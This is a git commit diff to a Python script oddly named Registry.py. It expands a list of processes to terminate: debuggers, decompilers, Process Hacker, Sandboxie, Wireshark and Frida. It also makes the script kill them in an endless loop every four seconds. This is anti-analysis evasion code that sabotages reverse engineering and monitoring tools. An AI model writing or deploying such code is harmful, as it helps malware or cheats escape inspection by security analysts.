554c643e8538a3547983bb152dc446b387dd1f3a
Crunchy.dev <150474806+Crunchyrocks1@users.noreply.github.com>
2025-01-07 15:33:57 -0600

    Update Registry.py

--- Logs/Windows/Registry.py
+++ Logs/Windows/Registry.py
@@ -12,16 +12,20 @@ def notify():
     winsound.Beep(1000, 750)  
 
 def close_apps():
-    processes_to_close = ['notepad.exe', 'cheatengine-x86_64.exe', 'ida.exe']
+    processes_to_close = [
+        'notepad.exe', 'cheatengine-x86_64.exe', 'ida.exe', 'x64dbg.exe', 'ollydbg.exe',
+        'dnspy.exe', 'processhacker.exe', 'sandboxie.exe', 'wireshark.exe', 'frida.exe'
+    ]
 
-    for proc in psutil.process_iter(['pid', 'name']):
-        try:
-            if proc.info['name'].lower() in processes_to_close:
-                proc.terminate()
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
+    while True:
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'].lower() in processes_to_close:
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        time.sleep(4)  # Check every second
 
 if __name__ == "__main__":
     notify()
     close_apps()
-    time.sleep(2)
